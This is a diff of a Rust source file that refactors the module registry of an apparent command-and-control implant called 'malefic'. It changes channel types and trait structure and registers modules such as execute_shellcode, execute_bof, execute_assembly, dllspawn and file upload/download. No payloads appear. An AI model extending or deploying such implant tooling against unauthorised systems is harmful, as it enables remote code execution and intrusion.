@@ -1,29 +1,32 @@
 #![feature(stmt_expr_attributes)]
 #![feature(type_alias_impl_trait)]
 #![feature(async_closure)]
+pub mod execute;
 pub mod fs;
 mod r#macro;
 pub mod net;
+pub mod prelude;
 pub mod sys;
-pub mod execute;
 
 use async_trait::async_trait;
-use malefic_proto::proto::{implantpb, modulepb};
+use futures::channel::mpsc::{UnboundedReceiver, UnboundedSender};
 use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::implantpb::Status;
+use malefic_proto::proto::{implantpb, modulepb};
 use std::collections::HashMap;
 use thiserror::Error;
 
 pub type MaleficModule = dyn Module + Send + Sync + 'static;
-pub type Output = async_std::channel::Sender<TaskResult>;
-pub type Input = async_std::channel::Receiver<Body>;
+pub type MaleficBundle = HashMap<String, Box<MaleficModule>>;
+pub type Output = UnboundedSender<TaskResult>;
+pub type Input = UnboundedReceiver<Body>;
 pub type Result = anyhow::Result<TaskResult>;
 
 #[derive(Error, Debug)]
 pub enum TaskError {
     #[error(transparent)]
     OperatorError(#[from] anyhow::Error),
-    
+
     #[error("")]
     NotExpectBody,
 
@@ -105,7 +108,7 @@ impl TaskResult {
     pub fn new_with_error(task_id: u32, task_error: TaskError) -> Self {
         TaskResult {
             task_id,
-            body: Body::Empty(Default::default()), 
+            body: Body::Empty(Default::default()),
             status: Status {
                 task_id,
                 status: task_error.id(), // module error
@@ -132,7 +135,7 @@ impl TaskResult {
 
 // 定义扩展trait
 #[async_trait]
-pub trait Module {
+pub trait Module: ModuleImpl {
     fn name() -> &'static str
     where
         Self: Sized;
@@ -140,17 +143,29 @@ pub trait Module {
     where
         Self: Sized;
     fn new_instance(&self) -> Box<MaleficModule>;
+    /*     
     async fn run(&mut self, id: u32, recv_channel: &mut Input, send_channel: &mut Output)
         -> Result;
+        */
+}
+
+#[async_trait]
+pub trait ModuleImpl {
+    async fn run(&mut self, id: u32, recv_channel: &mut Input, send_channel: &mut Output)
+        -> Result;
+    
 }
 
 #[no_mangle]
 #[allow(improper_ctypes_definitions)]
-pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
-    let mut map: HashMap<String, Box<MaleficModule>> = HashMap::new();
+pub extern "C" fn register_modules() -> MaleficBundle {
+    let mut map: MaleficBundle = HashMap::new();
 
     #[cfg(debug_assertions)]
-    map.insert(sys::example::Example::name().to_string(), Box::new(sys::example::Example::new()));
+    map.insert(
+        sys::example::Example::name().to_string(),
+        Box::new(sys::example::Example::new()),
+    );
 
     register_module!(map, "pwd", fs::pwd::Pwd);
     register_module!(map, "cd", fs::cd::Cd);
@@ -165,7 +180,12 @@ pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
     register_module!(map, "download", net::download::Download);
 
     register_module!(map, "exec", execute::exec::Exec);
-    register_module!(map,"execute_shellcode",execute::execute_shellcode::ExecuteShellcode);
+    register_module!(map, "open", execute::open::Open);
+    register_module!(
+        map,
+        "execute_shellcode",
+        execute::execute_shellcode::ExecuteShellcode
+    );
     register_module!(map, "kill", sys::kill::Kill);
     register_module!(map, "whoami", sys::whoami::Whoami);
     register_module!(map, "env", sys::env::Env);
@@ -180,7 +200,7 @@ pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
         register_module!(map, "chmod", fs::chmod::Chmod);
         register_module!(map, "chown", fs::chown::Chown);
     }
-    
+
     #[cfg(target_os = "windows")]
     {
         register_module!(map, "wmi", sys::wmi::WmiQuery);
@@ -210,17 +230,29 @@ pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
         // register_module!(map, "pipe", fs::pipe::PipeClose);
         register_module!(map, "pipe", fs::pipe::PipeRead);
         register_module!(map, "pipe", fs::pipe::PipeUpload);
-        
+
         register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
         #[cfg(feature = "execute_powershell")]
-        register_module!(map, "execute_powershell",execute::execute_powershell::ExecutePowershell);
-        
+        register_module!(
+            map,
+            "execute_powershell",
+            execute::execute_powershell::ExecutePowershell
+        );
+
         #[cfg(feature = "execute_assembly")]
-        register_module!(map, "execute_assembly",execute::execute_assembly::ExecuteAssembly);
-        
-        register_module!(map, "dllspawn",execute::dllspawn::ExecuteDllSpawn);
-        register_module!(map, "inline_local",execute::inline_local::InlineLocal);
-        register_module!(map, "execute_armory",execute::execute_armory::ExecuteArmory);
+        register_module!(
+            map,
+            "execute_assembly",
+            execute::execute_assembly::ExecuteAssembly
+        );
+
+        register_module!(map, "dllspawn", execute::dllspawn::ExecuteDllSpawn);
+        register_module!(map, "inline_local", execute::inline_local::InlineLocal);
+        register_module!(
+            map,
+            "execute_armory",
+            execute::execute_armory::ExecuteArmory
+        );
         register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
         register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
         register_module!(map, "execute_local", execute::execute_local::ExecuteLocal);
